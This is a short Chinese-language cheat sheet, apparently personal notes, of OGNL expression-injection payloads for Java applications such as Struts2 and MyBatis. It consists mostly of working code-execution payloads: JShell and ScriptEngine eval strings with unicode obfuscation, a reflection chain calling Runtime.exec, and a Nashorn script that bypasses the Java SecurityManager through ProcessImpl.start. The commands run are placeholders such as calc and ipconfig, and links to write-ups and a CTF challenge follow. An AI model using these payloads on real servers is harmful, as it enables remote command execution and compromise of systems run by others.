# OGNL bypass
```java
${@jdk.jshell.JShell@create().eval('java.lang.Runtime.getRuntime().exec("")}

new javax.script.ScriptEngineManager().getEngineByName("js").eval(此处的Payload可以进行unicode编码)

new javax.script.ScriptEngineManager().getEngineByName("js").eval("new j\u0061va.lang.ProcessBuilder['(java.l\u0061ng.String[])'](['cmd.exe','/c','calc']).start()\u003B");
可参考s2的exp
jdk9+
@jdk.jshell.Jshell@create().eval('code');

${(#cls = #this.getClass().forName("java.lang.Runtime")).(#rt=#cls.getDeclaredMethod("getRuntime",null).invoke(null,null)).(#exec=#cls.getDeclaredMethod("exec", this.getClass().forName("[Ljava.lang.String;"))).(#exec.invoke(#rt,"calc".split(",")))}
```
## bypass sm
参考 js的bypass
```java
String bypass_sm_exp = "var str = Java.type('java.lang.String[]').class;" +
                "var map = Java.type('java.util.Map').class;" +
                "var string = Java.type('java.lang.String').class;" +
                "var Redirect = Java.type('java.lang.ProcessBuilder.Redirect[]').class;" +
                "var boolean = Java.type('boolean').class;" +
                "var c = java.lang.Class.forName('java.lang.ProcessImpl');" +
                "var start = c.getDeclaredMethod('start',str,map,string,Redirect,boolean);" +
                "start.setAccessible(true);" +
                "var anArray = [\"cmd\", \"/c\", \"ipconfig\"];" +
                "var cmd = Java.to(anArray, Java.type(\"java.lang.String[]\"));" +
                "var input = start.invoke(null,cmd,null,null,null,false).getInputStream();" +
                "var reader = new java.io.BufferedReader(new java.io.InputStreamReader(input));" +
                "var stringBuilder = new java.lang.StringBuilder();" +
                "var line = null;" +
                "while((line = reader.readLine())!=null){" +
                "stringBuilder.append(line);" +
                "stringBuilder.append('\\r\\n');"+
                "}" +
                "stringBuilder.toString();" +
                "print(stringBuilder)";
                
 new javax.script.ScriptEngineManager().getEngineByName("js").eval(bypass_sm_exp);               
```

>参考
>https://www.sec-in.com/article/753
>https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/
## Bypass

https://github.blog/2023-01-27-bypassing-ognl-sandboxes-for-fun-and-charities/

## mybatis 存在${}的ognl
参考2022的d3ctf ezsql
